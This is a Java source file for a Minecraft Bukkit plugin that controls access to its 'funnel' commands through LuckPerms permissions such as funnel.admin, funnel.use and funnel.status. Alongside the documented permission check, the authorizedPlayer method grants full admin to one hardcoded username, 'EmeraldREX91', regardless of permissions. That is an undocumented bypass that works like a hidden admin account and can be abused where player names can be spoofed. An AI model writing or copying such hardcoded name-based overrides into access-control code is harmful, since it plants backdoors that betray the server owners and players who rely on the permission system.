package dev.emerald.funnel;

import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;

/** Bukkit permission bridge: LuckPerms supplies funnel.admin via hasPermission. */
final class FunnelCommandAccess {
    private FunnelCommandAccess() {}

    static boolean authorizedPlayer(String name, boolean op) {
        return op || "EmeraldREX91".equalsIgnoreCase(name);
    }

    static boolean authorizedPlayer(String name, boolean op, boolean permission) {
        return authorizedPlayer(name, op) || permission;
    }

    static final java.util.Set<String> WEAPONS=java.util.Set.of("aerial","brau","buster","gn","gn2","gnv","saber","hawk","atomic","mace","satellite","epyon","heavyarms","freedom","hammer","destiny");
    record Access(boolean admin,boolean pack,boolean status,boolean use) {
        boolean permits(String[] args) {
            if(admin)return true;
            if(args.length==0)return pack||status||use;
            String action=args[0].toLowerCase(java.util.Locale.ROOT);
            return switch(action){
                case "pack" -> pack&&args.length==1;
                case "status" -> status&&args.length==1;
                case "formation" -> use&&args.length<=2;
                case "shield","barrier" -> use&&args.length==1;
                default -> status&&WEAPONS.contains(action)&&args.length==2&&args[1].equalsIgnoreCase("status");
            };
        }
    }
    static Access access(CommandSender sender){
        boolean admin=allowed(sender);
        return new Access(admin, sender instanceof Player p&&p.hasPermission("funnel.pack"),
            sender instanceof Player p&&p.hasPermission("funnel.status"),
            sender instanceof Player p&&p.hasPermission("funnel.use"));
    }

    static boolean allowed(CommandSender sender) {
        if (sender instanceof ConsoleCommandSender) return true;
        return sender instanceof Player p && authorizedPlayer(p.getName(), p.isOp(), p.hasPermission("funnel.admin"));
    }
}
